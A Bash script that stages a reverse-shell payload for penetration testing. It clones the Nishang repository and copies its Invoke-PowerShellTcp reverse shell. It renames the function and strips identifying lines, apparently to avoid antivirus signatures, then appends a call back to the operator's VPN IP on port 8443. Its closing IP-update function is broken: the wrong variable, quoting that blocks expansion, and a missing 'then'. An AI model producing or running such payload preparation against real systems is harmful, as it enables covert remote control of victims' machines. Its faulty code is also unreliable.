#!/bin/bash

## ==========[ TEXT COLORS ]============= ##
GREEN="\033[01;32m"     # Success
YELLOW="\033[01;33m"    # Warnings/Information
RED="\033[01;31m"       # Issues/Errors
BLUE="\033[01;34m"      # Heading
ORANGE="\033[38;5;208m" # Debugging
PURPLE="\033[01;35m"    # Other
GREY="\e[90m"           # Subdued Text
BOLD="\033[01;01m"      # Highlight
RESET="\033[00m"        # Normal

## =============[ CONSTANTS ]============= ##
TOOLKIT_DIR="${HOME}/toolkit/transfers"
NEWWORD="rangercat"


# ================================[  BEGIN  ]================================ #
echo -e -n "\n\n${GREEN}[+]${RESET} Are you currently on your target VPN? If yes, we'll capture your current VPN client IP ${YELLOW}(Y/N)${RESET}: "
while read -r -n 1 -t 20 -s answer; do
    if [[ $answer = [YyNn] ]]; then
        [[ $answer = [Yy] ]] && retval=0
        [[ $answer = [Nn] ]] && retval=1
        break
    fi
done
echo
if [[ $retval -eq 0 ]]; then
    ip_address=$(hostname -I | awk '{print $2}')
    echo -e "${GREEN}[*]${RESET} Your VPN client IP is: $ip_address"
    export aip="$ip_address"
    echo -e "${GREEN}[*]${RESET} Created '${BLUE}aip${RESET}' env var with your VPN IP you can use in this terminal's session"
fi


cd ~
mkdir git 2>/dev/null
cd git
git clone https://github.com/samratashok/nishang 2>/dev/null || cd nishang && git pull

mkdir -p "${TOOLKIT_DIR}" 2>/dev/null

cp "${HOME}/git/nishang/Shells/Invoke-PowerShellTcp.ps1" "${TOOLKIT_DIR}/${NEWWORD}.ps1"

file="${TOOLKIT_DIR}/${NEWWORD}.ps1"
sed -i 's/Invoke-PowerShellTcp/rangercat/g' "${file}"
# Remove one or more choice texts
sed -i '/^Nishang.*/d' "${file}"

if [[ "$ip_address" != "" ]]; then
    echo "${NEWWORD} -Reverse -IPAddress ${ip_address} -Port 8443" >> "${file}"
    echo -e "${GREEN}[*]${RESET} Extra command added to nishang shell file with your current IP. Edit this file if it ever changes!"
    echo -e "\tPort used: 8443"
else
    echo "${NEWWORD} -Reverse -IPAddress <ip> -Port 8443" >> "${file}"
    echo -e "${GREEN}[*]${RESET} Extra command added to nishang shell file without IP. Edit the file before actual use!"
    echo -e "\tPort used: 8443"
fi

echo -e "${GREEN}[*]${RESET} Nishang has been downloaded, and a string-replaced shell file is at: ${file}"



function update_nishang_shell() {
    file="${TOOLKIT_DIR}/${NEWWORD}.ps1"
    ip1=$(hostname -I | awk '{print $1}')
    ip2=$(hostname -I | awk '{print $2}')
    ip3=$(hostname -I | awk '{print $3}')
    echo -e "IP 1: $ip1 \t IP 2: $ip2 \t IP 3: $ip3"
    echo -e -n "${GREEN}[+]${RESET} Choose the IP you want to use ${YELLOW}(1, 2, 3)${RESET}: "
    while read -r -n 1 -t 20 -s answer; do
        if [[ $answer = [123] ]]; then
            [[ $answer = [1] ]] && retval=1
            [[ $answer = [2] ]] && retval=2
            [[ $answer = [3] ]] && retval=3
            break
        fi
    done
    echo
    if [[ $retval -eq 1 ]]; then
        sed -i 's/-IPAddress [0-9.]*/$ip1/' "${file}"
    elif [[ $retval -eq 2 ]]; then
        sed -i 's/-IPAddress [0-9.]*/$ip1/' "${file}"
    elif [[ $retval -eq 3 ]];
        sed -i 's/-IPAddress [0-9.]*/$ip1/' "${file}"
    else
        echo -e "[ERR] Something went wrong, nishang file was not modified with an updated IP Address."
    fi
}

